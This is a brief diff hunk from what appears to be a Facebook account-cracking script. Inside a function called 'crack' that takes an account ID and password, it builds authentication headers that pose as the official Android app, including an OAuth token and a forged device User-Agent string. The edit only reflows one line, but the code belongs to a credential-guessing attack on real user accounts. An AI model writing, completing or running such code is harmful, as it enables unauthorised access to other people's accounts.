@@ -502,8 +502,7 @@ def crack(idf,pwv):
                                 'generate_machine_id':'1',
                                 'fb_api_req_friendly_name':'authenticate',
                         }
-            header_freefb = {
-                                'Authorization':f'OAuth {accessToken}',
+            header_freefb = {'Authorization':f'OAuth {accessToken}',
                                 'X-FB-Friendly-Name':'authenticate',
                                 'X-FB-Connection-Type':'unknown',
                                 'User-Agent':"[FBAN/FB4A;FBAV/"+zomir+".0.0.6.119;FBBV/30034644;FBDM/{density=3.02,width=720,height=1544};FBLC/en_US;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/"+cph+";FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
